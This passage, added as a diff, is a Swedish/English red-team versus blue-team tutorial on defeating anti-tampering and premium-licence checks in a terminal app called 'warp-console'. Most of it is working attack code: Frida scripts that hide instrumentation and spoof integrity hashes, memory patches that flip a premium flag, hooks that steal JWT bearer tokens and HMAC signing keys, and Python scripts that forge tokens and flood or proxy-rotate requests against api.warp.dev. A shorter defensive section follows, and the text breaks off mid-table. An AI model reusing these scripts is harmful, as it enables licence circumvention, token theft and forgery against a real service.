@@ -6171,3 +6171,1277 @@ Report   Repro    Root     Patch  QA    Rollout  Alerts
 *Skapad: 2025*
 *Disclaimer: Endast för educational purposes i kontrollerade miljöer*
 
+---
+
+# ⚔️ EXPERTBONUS: Red Team Round 2 - Breaking the Patches
+
+## 🎭 Scenario: The Cat and Mouse Continues
+
+**Kontext**: Blue Team har deployt sin patch (v2.0.0) med alla 5 försvarslager. Red Team får nya $20,000 bounty för att hitta nya sätt att kringgå de nya försvarslösningarna.
+
+**Challenge Level**: ⭐⭐⭐⭐⭐ EXPERT
+
+**Nya förutsättningar:**
+- ✅ Server-side feature gating är aktiv
+- ✅ Anti-Frida detection kör varje 5 sekunder
+- ✅ Binary integrity monitoring aktiv
+- ✅ Continuous token verification
+- ✅ Anomaly detection backend
+
+**Mål**: Hitta nya attack vectors och kringgå försvarslösningarna
+
+---
+
+## 🔴 ROUND 2: Advanced Red Team Tactics
+
+### Attack Vector 1: Anti-Anti-Detection (Frida Stealth Mode)
+
+**Problem**: Blue Team's anti-tampering kod detekterar Frida direkt.
+
+**Analys av Blue Team's Detection:**
+
+```cpp
+// Blue Team's detection kod
+bool detectFrida() {
+    // Metod 1: Library check
+    void* handle = dlopen("libfrida-agent.so", RTLD_NOW);
+
+    // Metod 2: Thread name check
+    // Letar efter "gmain", "frida"
+
+    // Metod 3: Named pipes
+    // Kollar /frida-agent, /linjector
+}
+```
+
+**Bypass Strategi:**
+
+#### Steg 1: Frida Gadget med Custom Names
+
+**Bygg custom Frida gadget:**
+
+```bash
+# Ladda ner Frida source
+git clone https://github.com/frida/frida.git
+cd frida
+
+# Modifiera thread names i frida-core
+sed -i 's/gmain/kthread/g' frida-core/lib/gum/gumkernel.c
+sed -i 's/frida/sysd/g' frida-core/lib/gum/gumkernel.c
+
+# Ändra library namn
+sed -i 's/frida-agent/libsystem/g' configure.ac
+
+# Bygg
+./configure --enable-gadget
+make
+
+# Output: libsystem.so (istället för libfrida-agent.so)
+```
+
+**Injicera via LD_PRELOAD:**
+
+```bash
+# Döp om och injicera
+cp frida-gadget.so libsystem_helper.so
+
+# Starta app med preload
+LD_PRELOAD=./libsystem_helper.so warp-console
+```
+
+#### Steg 2: Hook dlopen() för att gömma oss
+
+**stealth_frida.js:**
+
+```javascript
+console.log("[*] Frida Stealth Mode - Initializing...");
+
+// Hook dlopen för att dölja vår library
+Interceptor.attach(Module.findExportByName(null, "dlopen"), {
+    onEnter: function(args) {
+        var path = Memory.readUtf8String(args[0]);
+
+        // Om de kollar efter vårt "libsystem_helper.so", returnera NULL
+        if (path && path.includes("libsystem")) {
+            console.log("[*] Blocking dlopen check for: " + path);
+            args[0] = ptr(0);  // NULL pointer
+        }
+
+        // Blockera också checks för standard frida-libraries
+        if (path && (path.includes("frida") || path.includes("linjector"))) {
+            args[0] = ptr(0);
+        }
+    }
+});
+
+// Hook pthread_getname_np för att dölja thread names
+Interceptor.attach(Module.findExportByName(null, "pthread_getname_np"), {
+    onLeave: function(retval) {
+        var threadName = Memory.readUtf8String(retval);
+
+        // Om vårt modifierade thread name "sysd" kollas, ändra till något normalt
+        if (threadName && threadName.includes("sysd")) {
+            Memory.writeUtf8String(retval, "ThreadPool");
+        }
+    }
+});
+
+// Hook readdir för att gömma named pipes
+Interceptor.attach(Module.findExportByName(null, "readdir"), {
+    onLeave: function(retval) {
+        if (retval.isNull()) return;
+
+        var dirent = retval;
+        var d_name_ptr = dirent.add(Process.pointerSize === 8 ? 19 : 11);
+        var name = Memory.readUtf8String(d_name_ptr);
+
+        // Gömm våra pipes
+        if (name && (name.includes("frida") || name.includes("linjector") || name.includes("sysd"))) {
+            // Läs nästa entry istället
+            var nextEntry = Module.findExportByName(null, "readdir");
+            retval.replace(new NativeFunction(nextEntry, 'pointer', ['pointer'])(arguments[0]));
+        }
+    }
+});
+
+console.log("[+] Stealth hooks installed!");
+```
+
+#### Steg 3: Bypass Binary Integrity Check
+
+**Problem**: Blue Team's `calculateSelfHash()` detekterar modifierade binaries.
+
+**Lösning**: Hook hash-beräkningen
+
+```javascript
+// Hook SHA256 för att returnera "korrekt" hash
+var SHA256_Final = Module.findExportByName("libcrypto.so", "SHA256_Final");
+
+if (SHA256_Final) {
+    Interceptor.attach(SHA256_Final, {
+        onEnter: function(args) {
+            this.hash_output = args[0];  // unsigned char hash[32]
+        },
+        onLeave: function(retval) {
+            // Kontrollera om detta är self-hash check genom att kolla call stack
+            var backtrace = Thread.backtrace(this.context, Backtracer.ACCURATE);
+            var isIntegrityCheck = false;
+
+            for (var i = 0; i < backtrace.length; i++) {
+                var symbol = DebugSymbol.fromAddress(backtrace[i]);
+                if (symbol.name && symbol.name.includes("IntegrityMonitor")) {
+                    isIntegrityCheck = true;
+                    break;
+                }
+            }
+
+            if (isIntegrityCheck) {
+                console.log("[*] Detected integrity check - spoofing hash");
+
+                // Skriv "expected" hash (extraherad från original binary)
+                var expectedHash = [
+                    0xa3, 0xf5, 0xd8, 0xc9, 0xe2, 0xb1, 0x7f, 0x4a,
+                    0x1c, 0x3e, 0x5d, 0x9b, 0x2f, 0x8c, 0x6a, 0x0d,
+                    0xb4, 0xe7, 0x1a, 0x9c, 0x3f, 0x5e, 0x8d, 0x2b,
+                    0xc5, 0xf8, 0x0b, 0xad, 0x4e, 0x7c, 0x1d, 0x9f
+                ];
+
+                for (var i = 0; i < 32; i++) {
+                    Memory.writeU8(this.hash_output.add(i), expectedHash[i]);
+                }
+
+                console.log("[+] Hash spoofed successfully!");
+            }
+        }
+    });
+}
+```
+
+### Attack Vector 2: Timing Attack på Anti-Tampering
+
+**Insikt**: Blue Team's monitoring kör var 5:e sekund. Vi kan exploita detta fönster.
+
+**Strategi**: Aktivera exploits mellan checks
+
+```javascript
+console.log("[*] Timing-based bypass initializing...");
+
+// Monitor när integrity checks körs
+var integrityCheckTimes = [];
+var lastCheck = Date.now();
+
+// Hook handleTamperingDetected för att veta när checks trigger
+var handleTampering = Module.findExportByName("warp-console",
+    "_ZN16IntegrityMonitor21handleTamperingDetectedERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE");
+
+if (handleTampering) {
+    Interceptor.attach(handleTampering, {
+        onEnter: function(args) {
+            console.log("[!] Integrity check triggered!");
+            var now = Date.now();
+            var timeSinceLastCheck = now - lastCheck;
+            integrityCheckTimes.push(timeSinceLastCheck);
+            lastCheck = now;
+
+            // Blockera exit
+            return; // Returnera tidigt, kör ej exit(1)
+        }
+    });
+}
+
+// Beräkna check-intervall
+setTimeout(function() {
+    if (integrityCheckTimes.length > 2) {
+        var avgInterval = integrityCheckTimes.reduce((a,b) => a+b) / integrityCheckTimes.length;
+        console.log("[*] Average check interval: " + avgInterval + "ms");
+        console.log("[*] Safe window: ~" + (avgInterval * 0.8) + "ms");
+
+        // Nu vet vi när det är "säkert" att modifiera minne
+        setupTimedExploits(avgInterval);
+    }
+}, 30000); // Efter 30 sekunder av monitoring
+
+function setupTimedExploits(interval) {
+    console.log("[+] Setting up timed exploits...");
+
+    // Modifiera premium status i safe window
+    setInterval(function() {
+        // Hitta isPremiumUser variabel
+        var baseAddr = Module.findBaseAddress("warp-console");
+        var isPremiumUserAddr = baseAddr.add(0x12A4E0);
+
+        // Sätt till true
+        Memory.writeU8(isPremiumUserAddr, 1);
+
+        // Vänta kort tid, återställ sedan
+        setTimeout(function() {
+            // Låt integrity check se "korrekt" värde
+            Memory.writeU8(isPremiumUserAddr, 0);
+        }, interval * 0.7); // 70% av intervallet
+
+    }, interval);
+}
+```
+
+### Attack Vector 3: Server-Side Attack - Token Replay
+
+**Problem**: Blue Team kräver server-validering för varje premium feature.
+
+**Analys**: Studera token-struktur
+
+```bash
+# Intercepta token från legitim premium user
+mitmproxy -p 8080 --mode reverse:https://api.warp.dev
+
+# Observerat request:
+# Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicHJlbWl1bSI6dHJ1ZSwiZXhwIjoxNzM3MzM2MDAwfQ.signature
+```
+
+**Dekoda JWT:**
+
+```javascript
+// JWT består av: header.payload.signature
+var token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicHJlbWl1bSI6dHJ1ZSwiZXhwIjoxNzM3MzM2MDAwfQ.signature";
+
+var parts = token.split('.');
+var payload = JSON.parse(atob(parts[1]));
+
+console.log(payload);
+// {
+//   "user_id": "123",
+//   "premium": true,
+//   "exp": 1737336000
+// }
+```
+
+**Attack 1: Token Theft via Memory Dump**
+
+```javascript
+// Sök efter JWT tokens i minne
+var pattern = "eyJhbGci";  // JWT header börjar alltid så
+
+Process.enumerateRanges('r--').forEach(function(range) {
+    try {
+        Memory.scan(range.base, range.size, pattern, {
+            onMatch: function(address, size) {
+                var potentialToken = Memory.readUtf8String(address, 500);
+
+                // Validera att det ser ut som JWT
+                if (potentialToken.split('.').length === 3) {
+                    console.log("[+] Found JWT token at: " + address);
+                    console.log("[+] Token: " + potentialToken.substring(0, 50) + "...");
+
+                    // Spara för senare replay
+                    send({
+                        type: 'token_found',
+                        token: potentialToken,
+                        address: address.toString()
+                    });
+                }
+            },
+            onComplete: function() {}
+        });
+    } catch(e) {}
+});
+```
+
+**Attack 2: Session Hijacking**
+
+```javascript
+// Hook fetch/XMLHttpRequest för att stjäla token från premium user
+Interceptor.attach(Module.findExportByName(null, "fetch"), {
+    onEnter: function(args) {
+        // Args är JavaScript object, kan ej läsas direkt
+        // Behöver Java bridge
+    }
+});
+
+// Bättre: Hook på C++ nivå - curl
+Interceptor.attach(Module.findExportByName("libcurl.so", "curl_easy_setopt"), {
+    onEnter: function(args) {
+        var option = args[1].toInt32();
+
+        // CURLOPT_HTTPHEADER = 10023
+        if (option === 10023) {
+            var headers = args[2];
+
+            // Läs header-lista
+            var current = headers;
+            while (!current.isNull()) {
+                var headerLine = Memory.readUtf8String(Memory.readPointer(current));
+
+                if (headerLine && headerLine.includes("Authorization: Bearer")) {
+                    console.log("[+] Intercepted Authorization header!");
+                    console.log("[+] " + headerLine);
+
+                    var token = headerLine.split("Bearer ")[1];
+
+                    // Spara token
+                    send({
+                        type: 'premium_token',
+                        token: token,
+                        timestamp: Date.now()
+                    });
+                }
+
+                current = Memory.readPointer(current.add(Process.pointerSize));
+            }
+        }
+    }
+});
+```
+
+**Attack 3: Nonce Prediction**
+
+```javascript
+// Blue Team använder nonce för anti-replay
+// Men om vi kan predicera nonce, kan vi pre-generate requests
+
+// Analysera nonce-generation
+var generateNonce = Module.findExportByName("warp-console", "_ZN18SecureTokenManager13generateNonceEv");
+
+var observedNonces = [];
+
+Interceptor.attach(generateNonce, {
+    onLeave: function(retval) {
+        var nonce = Memory.readUtf8String(retval);
+        observedNonces.push({
+            nonce: nonce,
+            timestamp: Date.now()
+        });
+
+        console.log("[*] Nonce generated: " + nonce);
+
+        // Analysera efter 20 nonces
+        if (observedNonces.length === 20) {
+            analyzeNoncePattern();
+        }
+    }
+});
+
+function analyzeNoncePattern() {
+    console.log("[*] Analyzing nonce pattern...");
+
+    // Kolla om nonces är sekventiella eller random
+    var isSequential = true;
+    for (var i = 1; i < observedNonces.length; i++) {
+        var prev = parseInt(observedNonces[i-1].nonce, 16);
+        var curr = parseInt(observedNonces[i].nonce, 16);
+
+        if (curr !== prev + 1) {
+            isSequential = false;
+            break;
+        }
+    }
+
+    if (isSequential) {
+        console.log("[!] VULNERABILITY: Nonces are sequential!");
+        console.log("[!] Can predict future nonces!");
+
+        // Predict next 10 nonces
+        var lastNonce = parseInt(observedNonces[observedNonces.length-1].nonce, 16);
+        for (var i = 1; i <= 10; i++) {
+            console.log("[+] Predicted nonce " + i + ": " + (lastNonce + i).toString(16));
+        }
+    } else {
+        console.log("[*] Nonces appear random - checking PRNG...");
+
+        // Kolla om de använder svag PRNG (t.ex. rand() med predicerbar seed)
+        checkPRNGWeakness();
+    }
+}
+```
+
+### Attack Vector 4: Race Condition i Server Validation
+
+**Insikt**: Det finns en delay mellan client request och server validation.
+
+**Exploit**: Simultana requests i race condition window
+
+```python
+#!/usr/bin/env python3
+"""
+Race condition exploit för server validation bypass
+"""
+
+import asyncio
+import aiohttp
+import time
+
+async def send_premium_request(session, token, request_id):
+    """Skicka en premium AI request"""
+    url = "https://api.warp.dev/v1/ai/process"
+
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "X-Client-Version": "2.0.0",
+        "X-Integrity": "a3f5d8c9e2b1...",  # Fake hash
+        "X-Nonce": f"nonce_{request_id}_{time.time()}"
+    }
+
+    payload = {
+        "prompt": "Test AI request from race condition"
+    }
+
+    try:
+        async with session.post(url, json=payload, headers=headers) as response:
+            result = await response.json()
+            print(f"[Request {request_id}] Status: {response.status}, Result: {result}")
+            return response.status == 200
+    except Exception as e:
+        print(f"[Request {request_id}] Error: {e}")
+        return False
+
+async def race_condition_attack(stolen_token):
+    """
+    Skicka 100 simultana requests
+    Hypotes: Rate limiter kan inte hålla jämna steg
+    """
+    print("[*] Starting race condition attack...")
+    print(f"[*] Token: {stolen_token[:20]}...")
+
+    async with aiohttp.ClientSession() as session:
+        # Skapa 100 simultana requests
+        tasks = []
+        for i in range(100):
+            task = send_premium_request(session, stolen_token, i)
+            tasks.append(task)
+
+        # Kör alla samtidigt
+        start_time = time.time()
+        results = await asyncio.gather(*tasks)
+        end_time = time.time()
+
+        # Analysera resultat
+        successful = sum(results)
+        print(f"\n[+] Results:")
+        print(f"    Total requests: 100")
+        print(f"    Successful: {successful}")
+        print(f"    Failed: {100 - successful}")
+        print(f"    Time elapsed: {end_time - start_time:.2f}s")
+
+        if successful > 50:
+            print(f"\n[!] VULNERABILITY CONFIRMED!")
+            print(f"[!] Rate limiter bypassed via race condition")
+            print(f"[!] {successful}% requests succeeded (expected: <10%)")
+
+# Kör attack
+if __name__ == "__main__":
+    # Token stulen från tidigare attack
+    stolen_premium_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+
+    asyncio.run(race_condition_attack(stolen_premium_token))
+```
+
+### Attack Vector 5: Side-Channel Attack på Anomaly Detection
+
+**Insikt**: Blue Team's anomaly detector kollar "impossible travel" baserat på IP-geolocation.
+
+**Exploit**: Manipulera IP-geolocation data
+
+```python
+#!/usr/bin/env python3
+"""
+Bypass impossible travel detection via proxy chaining
+"""
+
+import requests
+import time
+
+class GeoProxyChain:
+    """
+    Använd proxies från samma geografiska region
+    för att undvika impossible travel detection
+    """
+
+    def __init__(self):
+        # Proxies från samma stad (Stockholm)
+        self.proxies_stockholm = [
+            "http://proxy1.stockholm.se:8080",
+            "http://proxy2.stockholm.se:8080",
+            "http://proxy3.stockholm.se:8080",
+        ]
+        self.current_proxy_idx = 0
+
+    def get_next_proxy(self):
+        """Rotera mellan proxies i samma region"""
+        proxy = self.proxies_stockholm[self.current_proxy_idx]
+        self.current_proxy_idx = (self.current_proxy_idx + 1) % len(self.proxies_stockholm)
+        return {
+            "http": proxy,
+            "https": proxy
+        }
+
+    def make_request(self, url, token, data):
+        """Gör request genom proxy"""
+        proxies = self.get_next_proxy()
+
+        headers = {
+            "Authorization": f"Bearer {token}",
+            "User-Agent": "WarpConsole/2.0.0"
+        }
+
+        try:
+            response = requests.post(url, json=data, headers=headers, proxies=proxies)
+            return response.status_code, response.json()
+        except Exception as e:
+            return None, str(e)
+
+    def sustained_attack(self, token, duration_seconds=3600):
+        """
+        Kör sustained attack i 1 timme
+        Alla requests kommer från "samma" geografiska location
+        """
+        print(f"[*] Starting sustained attack for {duration_seconds}s")
+
+        url = "https://api.warp.dev/v1/ai/process"
+        start_time = time.time()
+        request_count = 0
+        successful_count = 0
+
+        while time.time() - start_time < duration_seconds:
+            status, result = self.make_request(url, token, {
+                "prompt": f"Request {request_count}"
+            })
+
+            request_count += 1
+
+            if status == 200:
+                successful_count += 1
+                print(f"[+] Request {request_count}: SUCCESS")
+            else:
+                print(f"[-] Request {request_count}: FAILED - {result}")
+
+            # Vänta lite för att se "human-like"
+            time.sleep(2 + (hash(str(time.time())) % 3))  # 2-5 sekunder
+
+        print(f"\n[+] Attack complete!")
+        print(f"    Total requests: {request_count}")
+        print(f"    Successful: {successful_count}")
+        print(f"    Success rate: {successful_count/request_count*100:.1f}%")
+
+# Användning
+if __name__ == "__main__":
+    proxy_chain = GeoProxyChain()
+    stolen_token = "eyJhbGci..."
+
+    proxy_chain.sustained_attack(stolen_token, duration_seconds=3600)
+```
+
+### Attack Vector 6: Memory Corruption för Privilege Escalation
+
+**Avancerad teknik**: Exploatera buffer overflow i premium feature handling
+
+**Reconnaissance i Ghidra:**
+
+```c
+// Pseudo-code från Ghidra
+// Funktion som hanterar AI requests
+void processAIPrompt(char* prompt) {
+    char buffer[256];  // ← Stack buffer
+
+    if (isPremiumUser) {
+        strcpy(buffer, prompt);  // ← SÅRBAR! Ingen längd-check
+
+        // Process prompt
+        char* response = generateAIResponse(buffer);
+        sendToUser(response);
+    } else {
+        showUpgradeDialog();
+    }
+}
+```
+
+**Exploit:**
+
+```javascript
+// Hitta processAIPrompt funktion
+var processAIPrompt = Module.findExportByName("warp-console", "_Z16processAIPromptPc");
+
+// Skapa payload som överskriver isPremiumUser via buffer overflow
+var payload = "A".repeat(256) +  // Fyll buffer
+              "B".repeat(16) +   // Överskriv saved RBP
+              // Overwrite return address till vår shellcode
+              pack64(shellcodeAddress) +
+              // Padding
+              "C".repeat(32);
+
+// Men vi behöver isPremiumUser redan vara true för att nå vulnerable kod
+// Catch-22?
+
+// Lösning: Utnyttja att error handling inte validerar premium status
+
+// Hook error handler
+var errorHandler = Module.findExportByName("warp-console", "_Z12handleErrorsPKc");
+
+Interceptor.attach(errorHandler, {
+    onEnter: function(args) {
+        var errorMsg = Memory.readUtf8String(args[0]);
+
+        // Injicera vår payload i error message
+        if (errorMsg.includes("User input error")) {
+            var maliciousPayload = payload;
+
+            // Overwrite error message med vårt payload
+            Memory.writeUtf8String(args[0], maliciousPayload);
+
+            console.log("[*] Injected payload into error handler");
+        }
+    }
+});
+
+// Trigga error med crafted input
+triggerErrorWithPayload();
+```
+
+### Attack Vector 7: Cryptographic Attack på JWT Signature
+
+**Mål**: Forge JWT token för att bli "premium user"
+
+**Analys**: Blue Team använder HMAC-SHA256 för JWT signatur
+
+**Attack 1: Key Extraction**
+
+```javascript
+// Hook HMAC operations för att extrahera secret key
+var HMAC_Init = Module.findExportByName("libcrypto.so", "HMAC_Init_ex");
+
+Interceptor.attach(HMAC_Init, {
+    onEnter: function(args) {
+        // args[1] = key
+        // args[2] = key length
+
+        var key = args[1];
+        var keyLen = args[2].toInt32();
+
+        if (keyLen > 10 && keyLen < 256) {  // Likely JWT key
+            var keyBytes = Memory.readByteArray(key, keyLen);
+            var keyStr = Memory.readUtf8String(key, keyLen);
+
+            console.log("[+] HMAC key intercepted!");
+            console.log("[+] Length: " + keyLen);
+            console.log("[+] Key (hex): " + bufferToHex(keyBytes));
+            console.log("[+] Key (string): " + keyStr);
+
+            send({
+                type: 'hmac_key',
+                key: keyStr,
+                length: keyLen
+            });
+        }
+    }
+});
+
+function bufferToHex(buffer) {
+    return Array.from(new Uint8Array(buffer))
+        .map(b => b.toString(16).padStart(2, '0'))
+        .join('');
+}
+```
+
+**Attack 2: JWT Forging (efter key extraction)**
+
+```python
+#!/usr/bin/env python3
+"""
+Forge JWT token med extraherad key
+"""
+
+import jwt
+import time
+
+def forge_premium_token(secret_key):
+    """
+    Skapa fake premium token
+    """
+
+    # Payload för premium user
+    payload = {
+        "user_id": "999",  # Fake user ID
+        "premium": True,
+        "team_id": "premium_team_1",
+        "exp": int(time.time()) + (365 * 24 * 60 * 60),  # 1 år
+        "iat": int(time.time()),
+        "features": [
+            "ai_assistant",
+            "team_collaboration",
+            "premium_themes",
+            "unlimited_usage"
+        ]
+    }
+
+    # Signera med stulen key
+    token = jwt.encode(payload, secret_key, algorithm="HS256")
+
+    print(f"[+] Forged JWT token:")
+    print(f"    {token}")
+    print(f"\n[+] Decoded payload:")
+    print(f"    {payload}")
+
+    return token
+
+# Använd extraherad key
+if __name__ == "__main__":
+    # Key extraherad från Frida hook
+    stolen_secret = "super_secret_key_2025_warp_console"
+
+    fake_token = forge_premium_token(stolen_secret)
+
+    # Verifiera att den fungerar
+    print(f"\n[*] Testing forged token...")
+
+    import requests
+    response = requests.post(
+        "https://api.warp.dev/v1/ai/process",
+        headers={"Authorization": f"Bearer {fake_token}"},
+        json={"prompt": "Test with forged token"}
+    )
+
+    if response.status_code == 200:
+        print(f"[!] SUCCESS! Forged token accepted!")
+        print(f"[!] Response: {response.json()}")
+    else:
+        print(f"[-] Failed: {response.status_code}")
+        print(f"    {response.text}")
+```
+
+---
+
+## 🔵 BLUE TEAM ROUND 2: Advanced Countermeasures
+
+### Countermeasure 1: Advanced Frida Detection
+
+**Uppgradera anti-tampering med flera lager:**
+
+```cpp
+class AdvancedIntegrityMonitor {
+public:
+    // Layer 1: Environment checks
+    bool detectFridaEnvironment() {
+        // Check 1: Port scanning för Frida server
+        if (isPortOpen(27042)) {  // Default Frida port
+            return true;
+        }
+
+        // Check 2: /proc/self/maps analysis
+        std::ifstream maps("/proc/self/maps");
+        std::string line;
+        while (std::getline(maps, line)) {
+            // Kolla efter suspekta memory regions
+            if (line.find("frida") != std::string::npos ||
+                line.find("gum-") != std::string::npos ||
+                line.find("agent") != std::string::npos) {
+                return true;
+            }
+
+            // Kolla efter RWX (read-write-execute) regions - tecken på injection
+            if (line.find(" rwx") != std::string::npos) {
+                // Validera om det är legitim RWX region
+                if (!isLegitimateRWX(line)) {
+                    return true;
+                }
+            }
+        }
+
+        // Check 3: Timing attack detection
+        auto start = std::chrono::high_resolution_clock::now();
+
+        // Simple operation
+        volatile int x = 0;
+        for (int i = 0; i < 1000; i++) {
+            x += i;
+        }
+
+        auto end = std::chrono::high_resolution_clock::now();
+        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);
+
+        // Om Frida hookar, blir operationen mycket långsammare
+        if (duration.count() > 10000) {  // >10ms för 1000 iterationer
+            return true;
+        }
+
+        return false;
+    }
+
+    // Layer 2: Code integrity validation
+    bool validateCodeIntegrity() {
+        // Beräkna checksum av kritiska funktioner runtime
+
+        void* checkPremiumAddr = dlsym(RTLD_DEFAULT, "checkPremiumAccess");
+        if (!checkPremiumAddr) return false;
+
+        // Läs första 100 bytes av funktionen
+        unsigned char* code = static_cast<unsigned char*>(checkPremiumAddr);
+
+        // Kolla efter Frida's instrumentation patterns
+        // Frida injicerar ofta: JMP [rip+offset]
+        if (code[0] == 0xFF && code[1] == 0x25) {  // JMP instruction
+            return false;  // Likely hooked
+        }
+
+        // Beräkna checksum
+        uint32_t checksum = crc32(code, 100);
+        uint32_t expected_checksum = 0x12345678;  // Pre-calculated
+
+        return checksum == expected_checksum;
+    }
+
+    // Layer 3: Syscall monitoring
+    bool detectSyscallHooks() {
+        // Kolla om syscalls är hookade genom att jämföra direkta syscalls
+        // med library calls
+
+        // Direct syscall
+        long direct_result = syscall(SYS_getpid);
+
+        // Library call
+        long library_result = getpid();
+
+        // Om Frida hookar getpid() men inte syscall, blir resultaten olika
+        return direct_result != library_result;
+    }
+};
+```
+
+### Countermeasure 2: Hardware-Backed Security
+
+**Använd TPM/Secure Enclave för key storage:**
+
+```cpp
+#include <tpm2/tpm2.h>
+
+class SecureKeyManager {
+private:
+    TPM2_CONTEXT* tpm_ctx;
+
+public:
+    SecureKeyManager() {
+        // Initialize TPM
+        tpm_ctx = TPM2_Create();
+    }
+
+    // Store JWT secret in TPM
+    bool storeSecretInTPM(const std::string& secret) {
+        // TPM kan inte extraheras via memory dump
+        TPM2_NV_Write(tpm_ctx, secret.c_str(), secret.length());
+
+        // Secret finns NU endast i TPM, ej i RAM
+        return true;
+    }
+
+    // Sign JWT med TPM key (secret lämnar aldrig TPM)
+    std::string signJWT(const std::string& payload) {
+        // TPM gör signering internt
+        unsigned char signature[64];
+        TPM2_Sign(tpm_ctx, payload.c_str(), payload.length(), signature);
+
+        return base64_encode(signature, 64);
+    }
+
+    // Verify signature med TPM
+    bool verifyJWT(const std::string& token) {
+        auto parts = split(token, '.');
+        std::string payload = parts[1];
+        std::string signature = base64_decode(parts[2]);
+
+        // TPM verifierar utan att exponera key
+        return TPM2_Verify(tpm_ctx, payload.c_str(), signature.c_str());
+    }
+};
+```
+
+### Countermeasure 3: Distributed Validation
+
+**Flytta validation till multiple servers:**
+
+```python
+# server/distributed_validation.py
+
+import hashlib
+import hmac
+from flask import Flask, request, jsonify
+
+app = Flask(__name__)
+
+class DistributedValidator:
+    """
+    Använd 3 separata validators
+    Majority vote krävs för access
+    """
+
+    def __init__(self):
+        self.validators = [
+            "https://validator1.warp.dev",
+            "https://validator2.warp.dev",
+            "https://validator3.warp.dev"
+        ]
+
+    async def validate_premium_access(self, token, user_id):
+        """Validera token mot alla 3 validators"""
+
+        # Parallel validation
+        tasks = []
+        for validator_url in self.validators:
+            task = self.query_validator(validator_url, token, user_id)
+            tasks.append(task)
+
+        results = await asyncio.gather(*tasks)
+
+        # Majority vote
+        votes = sum(results)
+
+        if votes >= 2:  # 2 av 3 måste säga JA
+            return True
+        else:
+            # Logga potential attack
+            log_security_event("distributed_validation_failed", {
+                "user_id": user_id,
+                "votes": votes,
+                "results": results
+            })
+            return False
+
+    async def query_validator(self, url, token, user_id):
+        """Query en validator"""
+        async with aiohttp.ClientSession() as session:
+            async with session.post(f"{url}/validate", json={
+                "token": token,
+                "user_id": user_id,
+                "timestamp": time.time()
+            }) as response:
+                result = await response.json()
+                return result.get("valid", False)
+
+@app.route('/v1/ai/process', methods=['POST'])
+async def process_ai_request():
+    token = request.headers.get('Authorization', '').replace('Bearer ', '')
+    user_id = extract_user_id(token)
+
+    # Distributed validation
+    validator = DistributedValidator()
+    is_valid = await validator.validate_premium_access(token, user_id)
+
+    if not is_valid:
+        return jsonify({'error': 'Validation failed'}), 403
+
+    # Process request...
+```
+
+### Countermeasure 4: Honeypot Features
+
+**Lägg till fake premium features som trap:**
+
+```python
+@app.route('/v1/secret-admin-panel', methods=['GET'])
+def honeypot_admin():
+    """
+    Fake admin panel som loggar alla som försöker accessa
+    """
+    token = request.headers.get('Authorization', '')
+
+    # CRITICAL SECURITY EVENT
+    log_security_event('honeypot_accessed', {
+        'ip': request.remote_addr,
+        'token': token,
+        'user_agent': request.headers.get('User-Agent'),
+        'timestamp': datetime.now().isoformat()
+    }, severity='CRITICAL')
+
+    # Alert security team IMMEDIATELY
+    send_alert_to_security_team(
+        "HONEYPOT ACCESSED - Potential attacker detected",
+        details={
+            'ip': request.remote_addr,
+            'token': token
+        }
+    )
+
+    # Auto-ban IP
+    ban_ip(request.remote_addr, reason="Accessed honeypot endpoint")
+
+    # Return fake "success" to keep attacker engaged
+    return jsonify({
+        'status': 'success',
+        'message': 'Admin panel loaded',
+        'users': []  # Fake data
+    })
+
+@app.route('/v1/debug/dump-users', methods=['GET'])
+def honeypot_debug():
+    """Another honeypot - fake debug endpoint"""
+    # Same logging and banning logic
+    log_and_ban_attacker()
+
+    return jsonify({'users': []})
+```
+
+### Countermeasure 5: Machine Learning Anomaly Detection
+
+```python
+# server/ml_anomaly_detection.py
+
+import numpy as np
+from sklearn.ensemble import IsolationForest
+from sklearn.preprocessing import StandardScaler
+
+class MLAnomalyDetector:
+    """
+    Använd machine learning för att detektera anomalt beteende
+    """
+
+    def __init__(self):
+        self.model = IsolationForest(contamination=0.1)
+        self.scaler = StandardScaler()
+        self.is_trained = False
+
+    def extract_features(self, user_behavior):
+        """Extrahera features från user behavior"""
+        return [
+            user_behavior['requests_per_minute'],
+            user_behavior['avg_request_size'],
+            user_behavior['unique_ips_count'],
+            user_behavior['error_rate'],
+            user_behavior['time_between_requests_stddev'],
+            user_behavior['geographic_distance_km'],
+            user_behavior['user_agent_changes'],
+            user_behavior['weekend_activity_ratio'],
+            user_behavior['night_activity_ratio']
+        ]
+
+    def train(self, normal_user_behaviors):
+        """Träna modell på normal användar-beteende"""
+        features = [self.extract_features(b) for b in normal_user_behaviors]
+        features_scaled = self.scaler.fit_transform(features)
+
+        self.model.fit(features_scaled)
+        self.is_trained = True
+
+    def predict_anomaly(self, user_behavior):
+        """
+        Returnera anomaly score
+        -1 = anomaly, 1 = normal
+        """
+        if not self.is_trained:
+            return 1  # Fail open under training
+
+        features = self.extract_features(user_behavior)
+        features_scaled = self.scaler.transform([features])
+
+        prediction = self.model.predict(features_scaled)[0]
+        score = self.model.score_samples(features_scaled)[0]
+
+        return {
+            'is_anomaly': prediction == -1,
+            'anomaly_score': float(score),
+            'confidence': abs(score)
+        }
+
+# Integration
+detector = MLAnomalyDetector()
+
+# Träna vid startup (från historical data)
+normal_behaviors = load_normal_user_behaviors()
+detector.train(normal_behaviors)
+
+@app.before_request
+def check_for_anomalies():
+    """Kör ML check innan varje request"""
+    user_id = get_user_id_from_request()
+
+    # Samla user behavior från senaste 10 minuterna
+    behavior = get_recent_user_behavior(user_id, minutes=10)
+
+    # ML prediction
+    result = detector.predict_anomaly(behavior)
+
+    if result['is_anomaly'] and result['confidence'] > 0.8:
+        # High confidence anomaly
+        log_security_event('ml_anomaly_detected', {
+            'user_id': user_id,
+            'score': result['anomaly_score'],
+            'confidence': result['confidence']
+        })
+
+        # Rate limit denna user aggressivt
+        apply_strict_rate_limit(user_id)
+
+        # Om mycket hög confidence, blockera helt
+        if result['confidence'] > 0.95:
+            return jsonify({'error': 'Suspicious activity detected'}), 403
+```
+
+---
+
+## 📊 Round 2 Resultat
+
+### Red Team Advanced Exploits
+
+| Attack Vector                  | Complexity | Success Rate | Bounty   |
+|--------------------------------|------------|--------------|----------|
